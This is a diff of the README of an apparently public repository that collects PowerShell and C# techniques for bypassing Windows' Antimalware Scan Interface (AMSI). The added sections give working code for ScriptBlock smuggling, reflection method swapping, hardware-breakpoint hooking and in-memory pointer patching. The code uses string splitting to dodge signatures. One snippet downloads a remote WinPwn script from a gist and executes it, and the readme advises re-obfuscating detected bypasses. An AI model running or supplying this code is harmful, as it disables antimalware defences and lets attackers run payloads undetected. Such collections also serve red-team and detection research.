@@ -1,37 +1,379 @@
 # Sponsored by
 
 [<img src="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell/raw/master/images/happy_alp.png" width="300" height="300">](https://www.bluebastion.net/) &emsp; &emsp; &emsp;
-[<img src="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell/raw/master/images/Kovert.png" width="250" height="250">](https://kovert.no/)
 
 # Amsi-Bypass-Powershell #
 This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts.
 
 Most of the scripts are detected by AMSI itself. So you have to find the [trigger](https://github.com/RythmStick/AMSITrigger) and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime. Alternatively obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working. You can also take a look at my [blog post](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/) about manually changing the signature to get a valid bypass again.
 
-0. [Using CLR hooking](#Using-CLR-hooking "Goto Using-CLR-hooking")
-1. [Patch the provider’s DLL of Microsoft MpOav.dll](#Patch-the-providers-DLL-of-Microsoft-MpOav.dll "Goto Patch-the-providers-DLL-of-Microsoft-MpOav.dll")
-2. [Scanning Interception and Provider function patching](#Scanning-Interception "Goto Scanning-Interception")  
-3. [Patching AMSI AmsiScanBuffer by rasta-mouse](#Patching-AMSI-AmsiScanBuffer-by-rasta-mouse "Goto Patching-AMSI-AmsiScanBuffer-by-rasta-mouse")
-4. [Patching AMSI AmsiOpenSession](#Patching-AMSI-AmsiOpenSession "Goto Patching-AMSI-AmsiOpenSession")
-5. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
-6. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
-7. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
-8. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
-9. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
-10. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
-11. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
-12. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
-13. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
-14. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
-15. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
-16. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
-17. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
-18. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
+0. [ScriptBlock Smuggling](#ScriptBlock-Smuggling "Goto ScriptBlock-Smuggling")
+1. [Reflection ScanContent Change](#Reflection-ScanContent-Change "Goto Reflection-ScanContent-Change")
+2. [Using Hardware Breakpoints](#Using-Hardware-Breakpoints "Goto Using-Hardware-Breakpoints")
+3. [Using CLR hooking](#Using-CLR-hooking "Goto Using-CLR-hooking")
+4. [Patch the provider’s DLL of Microsoft MpOav.dll](#Patch-the-providers-DLL-of-Microsoft-MpOav.dll "Goto Patch-the-providers-DLL-of-Microsoft-MpOav.dll")
+5. [Scanning Interception and Provider function patching](#Scanning-Interception "Goto Scanning-Interception")  
+6. [Patching AMSI AmsiScanBuffer by rasta-mouse](#Patching-AMSI-AmsiScanBuffer-by-rasta-mouse "Goto Patching-AMSI-AmsiScanBuffer-by-rasta-mouse")
+7. [Patching AMSI AmsiOpenSession](#Patching-AMSI-AmsiOpenSession "Goto Patching-AMSI-AmsiOpenSession")
+8. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
+9. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
+10. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
+11. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
+12. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
+13. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
+14. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
+15. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
+16. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
+17. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
+18. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
+19. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
+20. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
+21. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
+22. [Patching the AmsiScanBuffer address in System.Management.Automation.dll](#Patching-AmsiScanBuffer-Address "Goto Patching-AmsiScanBuffer-Address")
+
+# ScriptBlock Smuggling
+- Original technique from [Hubbl3](https://x.com/_Hubbl3)
+- Explained here [ScriptBlockSmuggling](https://bc-security.org/scriptblock-smuggling/)
+
+```powershell
+$c = (new-Object net.webclient).downloadstring('https://gist.githubusercontent.com/S3cur3Th1sSh1t/2f4d37fde889af8f02b287db84f8ec4b/raw/0e2823c209fb7ca85f1aa3d0a0ab9c7871ef97bd/winpwn.ps1')
+$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
+$ExecutedAst = [ScriptBlock]::Create("$c").Ast
+$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
+                                                                   $null,
+                                                                   $null,
+                                                                   $null,
+                                                                   $ExecutedAst.EndBlock.Copy(),
+                                                                   $null)
+$Sb = $Ast.GetScriptBlock()
+# Any function - such as in this case WinPwn - that you want to be executed must be already called in the Scriptblock on the remote webserver. Fun fact, scripts that are loaded by the Script itself via iex(new-object net.webclient) also bypass AMSI.
+& $Sb
+```
+
+# Reflection ScanContent Change
+- Code published here: [cybersectroll/TrollAMSI](https://github.com/cybersectroll/TrollAMSI)
+
+```powershell
+class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
+$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
+$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
+[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
+```
+
+# Using Hardware Breakpoints
+- Original technique from @_EthicalChaos_ (https://twitter.com/_EthicalChaos_)
+- C# Code by @d_tranman: https://twitter.com/d_tranman/status/1628954053115002881
+- Only slight modifications by me for Powershell compitability
+
+```powershell
+$HardwareBreakpoint = @"
+// Technique from @_EthicalChaos_ (https://twitter.com/_EthicalChaos_)
+// Original Code by @d_tranman: https://twitter.com/d_tranman/status/1628954053115002881
+// Slight modifications by @ShitSecure for Powershell runtime compitability as the original code could not be used like this. Also the removal of the Hardware breakpoint was removed, so that every following future Powershell command bypasses AMSI as well.
+
+using System;
+using System.Collections.Generic;
+using System.Linq.Expressions;
+using System.Linq;
+using System.Runtime.CompilerServices;
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+namespace Test
+{
+    // CCOB IS THE GOAT
+   
+    public class Program
+    {
+        static string a = "msi";
+        static string b = "anB";
+        static string c = "ff";
+        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
+        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
+        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
+        
+        public static void SetupBypass()
+        {
+
+            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
+            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;
+
+            MethodInfo method = typeof(Program).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
+            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
+            
+            // Saving our context to a struct
+            Marshal.StructureToPtr(ctx, pCtx, true);
+            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
+            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));
+
+            EnableBreakpoint(ctx, pABuF, 0);
+
+            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
+
+        }
+        
+        public static long Handler(IntPtr exceptions)
+        {
+            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
+            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));
+
+            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
+            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));
+
+            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
+            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));
+
+            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
+            {
+                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);
+
+                // THE OUTPUT AMSIRESULT IS A POINTER, NOT THE EXPLICIT VALUE AAAAAAAAAA
+                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean
+                //Console.WriteLine("Buffer: 0x{0:X}", (long)ContextRecord.R8);
+                //Console.WriteLine("Scan Result: 0x{0:X}", Marshal.ReadInt32(ScanResult));
+
+                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);
+
+                ContextRecord.Rip = ReturnAddress;
+                ContextRecord.Rsp += 8;
+                ContextRecord.Rax = 0; // S_OK
+                
+                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
+                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
+            }
+            else
+            {
+                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
+            }
+
+        }
+        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
+        {
+
+            switch (index)
+            {
+                case 0:
+                    ctx.Dr0 = (ulong)address.ToInt64();
+                    break;
+                case 1:
+                    ctx.Dr1 = (ulong)address.ToInt64();
+                    break;
+                case 2:
+                    ctx.Dr2 = (ulong)address.ToInt64();
+                    break;
+                case 3:
+                    ctx.Dr3 = (ulong)address.ToInt64();
+                    break;
+            }
+
+            //Set bits 16-31 as 0, which sets
+            //DR0-DR3 HBP's for execute HBP
+            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
+
+            //Set DRx HBP as enabled for local mode
+            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
+            ctx.Dr6 = 0;
+
+            // Now copy the changed ctx into the original struct
+            Marshal.StructureToPtr(ctx, pCtx, true);
+        }
+        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
+        {
+            ulong mask = (1UL << bits) - 1UL;
+            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
+            return dw;
+        }
+    }
+    public class WinAPI
+    {
+        public const UInt32 DBG_CONTINUE = 0x00010002;
+        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
+        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
+        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
+        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
+        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
+        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
+        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
+        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
+        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
+        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
+        public const Int32 RIP_EVENT = 9;
+        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;
+
+        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
+        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
+        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
+        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
+        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
+        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
+        public const UInt32 DBG_CONTROL_C = 0x40010006;
+        public const UInt32 DEBUG_PROCESS = 0x00000001;
+        public const UInt32 CREATE_SUSPENDED = 0x00000004;
+        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;
+
+        public const Int32 AMSI_RESULT_CLEAN = 0;
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
+
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
+        [Flags]
+        public enum CONTEXT64_FLAGS : uint
+        {
+            CONTEXT64_AMD64 = 0x100000,
+            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
+            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
+            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
+            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
+            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
+            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
+            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct M128A
+        {
+            public ulong High;
+            public long Low;
+
+            public override string ToString()
+            {
+                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
+            }
+        }
+
+        /// <summary>
+        /// x64
+        /// </summary>
+        [StructLayout(LayoutKind.Sequential, Pack = 16)]
+        public struct XSAVE_FORMAT64
+        {
+            public ushort ControlWord;
+            public ushort StatusWord;
+            public byte TagWord;
+            public byte Reserved1;
+            public ushort ErrorOpcode;
+            public uint ErrorOffset;
+            public ushort ErrorSelector;
+            public ushort Reserved2;
+            public uint DataOffset;
+            public ushort DataSelector;
+            public ushort Reserved3;
+            public uint MxCsr;
+            public uint MxCsr_Mask;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+            public M128A[] FloatRegisters;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+            public M128A[] XmmRegisters;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
+            public byte[] Reserved4;
+        }
+
+        /// <summary>
+        /// x64
+        /// </summary>
+        [StructLayout(LayoutKind.Sequential, Pack = 16)]
+        public struct CONTEXT64
+        {
+            public ulong P1Home;
+            public ulong P2Home;
+            public ulong P3Home;
+            public ulong P4Home;
+            public ulong P5Home;
+            public ulong P6Home;
+
+            public CONTEXT64_FLAGS ContextFlags;
+            public uint MxCsr;
+
+            public ushort SegCs;
+            public ushort SegDs;
+            public ushort SegEs;
+            public ushort SegFs;
+            public ushort SegGs;
+            public ushort SegSs;
+            public uint EFlags;
+
+            public ulong Dr0;
+            public ulong Dr1;
+            public ulong Dr2;
+            public ulong Dr3;
+            public ulong Dr6;
+            public ulong Dr7;
+
+            public ulong Rax;
+            public ulong Rcx;
+            public ulong Rdx;
+            public ulong Rbx;
+            public ulong Rsp;
+            public ulong Rbp;
+            public ulong Rsi;
+            public ulong Rdi;
+            public ulong R8;
+            public ulong R9;
+            public ulong R10;
+            public ulong R11;
+            public ulong R12;
+            public ulong R13;
+            public ulong R14;
+            public ulong R15;
+            public ulong Rip;
+
+            public XSAVE_FORMAT64 DUMMYUNIONNAME;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
+            public M128A[] VectorRegister;
+            public ulong VectorControl;
+
+            public ulong DebugControl;
+            public ulong LastBranchToRip;
+            public ulong LastBranchFromRip;
+            public ulong LastExceptionToRip;
+            public ulong LastExceptionFromRip;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct EXCEPTION_RECORD
+        {
+            public uint ExceptionCode;
+            public uint ExceptionFlags;
+            public IntPtr ExceptionRecord;
+            public IntPtr ExceptionAddress;
+            public uint NumberParameters;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct EXCEPTION_POINTERS
+        {
+            public IntPtr pExceptionRecord;
+            public IntPtr pContextRecord;
+        }
+    }
+}
+
+
+"@
+
+Add-Type -TypeDefinition $HardwareBreakpoint
+
+[Test.Program]::SetupBypass()
+
+```
 
 # Using CLR hooking
 - Source: [https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)
 
-```
+```powershell
 
 $code = @"
 using System;
@@ -124,7 +466,7 @@ Add-Type $code
 
 ## With Add-Type
 
-```
+```powershell
 
 $APIs = @"
 using System;
@@ -162,7 +504,7 @@ $Uninitialize.Invoke($object,$null)
 
 ## Using reflection
 
-```
+```powershell
 function Get-ProcAddress {
     Param(
         [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
@@ -241,7 +583,7 @@ $Uninitialize.Invoke($object,$null)
 - Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf), author: Maor Korkos (@maorkor)
 
 ## 32 Bit (Powershell x86 only)
-```
+```powershell
 Write-Host "AMSI providers' scan interception"
 Write-Host "-- Maor Korkos (@maorkor)"
 Write-Host "-- 32bit implemetation"
@@ -334,7 +676,7 @@ while ($AntimalwareProvider -ne 0)
 ```
 
 # Patching AMSI AmsiScanBuffer by rasta-mouse #
-```
+```powershell
 $Win32 = @"
 
 using System;
@@ -380,7 +722,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
 
 # Patching AMSI AmsiOpenSession
-```
+```powershell
 # Author: Matheus Alexandre, https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/
 function lookFuncAddr{
 Param($moduleName, $functionName)
@@ -1200,4 +1542,137 @@ $patch = [byte[]] (
 
 $a = 0
 $VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
+```
+
+
+
+# Patching AmsiScanBuffer Address
+## Credit: https://www.offsec.com/offsec/amsi-write-raid-0day-vulnerability/
+
+```
+function MagicBypass {
+
+# Define named parameters
+param(
+    $InitialStart = 0x50000,
+    $NegativeOffset= 0x50000,
+    $MaxOffset = 0x1000000,
+    $ReadBytes = 0x50000
+)
+
+$APIs = @"
+using System;
+using System.ComponentModel;
+using System.Management.Automation;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class APIs {
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+
+    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+   
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
+    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
+
+    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
+    public static int Dummy() {
+     return 1;
+    }
+}
+"@
+
+Add-Type $APIs
+
+$InitialDate=Get-Date;
+
+$string = 'hello, world'
+$string = $string.replace('he','a')
+$string = $string.replace('ll','m')
+$string = $string.replace('o,','s')
+$string = $string.replace(' ','i')
+$string = $string.replace('wo','.d')
+$string = $string.replace('rld','ll')
+
+$string2 = 'hello, world'
+$string2 = $string2.replace('he','A')
+$string2 = $string2.replace('ll','m')
+$string2 = $string2.replace('o,','s')
+$string2 = $string2.replace(' ','i')
+$string2 = $string2.replace('wo','Sc')
+$string2 = $string2.replace('rld','an')
+
+$string3 = 'hello, world'
+$string3 = $string3.replace('hello','Bu')
+$string3 = $string3.replace(', ','ff')
+$string3 = $string3.replace('world','er')
+
+$Address = [APIS]::GetModuleHandle($string)
+[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)
+
+$Assemblies = [appdomain]::currentdomain.getassemblies()
+$Assemblies |
+  ForEach-Object {
+    if($_.Location -ne $null){
+     $split1 = $_.FullName.Split(",")[0]
+     If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
+       $Types = $_.GetTypes()
+     }
+    }
+}
+
+$Types |
+  ForEach-Object {
+    if($_.Name -ne $null){
+     If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
+       $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
+     }
+    }
+}
+
+$Methods |
+  ForEach-Object {
+    if($_.Name -ne $null){
+     If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
+       $MethodFound = $_
+     }
+    }
+}
+
+[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
+[IntPtr] $Handle = [APIs]::GetCurrentProcess()
+$dummy = 0
+$ApiReturn = $false
+   
+:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
+    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
+    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
+    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
+    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
+     $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
+     [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
+     if ($PointerToCompare -eq $funcAddr) {
+       Write-Host "Found @ $($i)!"
+       [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
+       break initialloop
+     }
+    }
+}
+[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
+$buf = [IntPtr[]] ($DummyPointer)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
+
+$FinishDate=Get-Date;
+$TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
+Write-Host "$TimeElapsed seconds"
+}
+MagicBypass
+
 ```
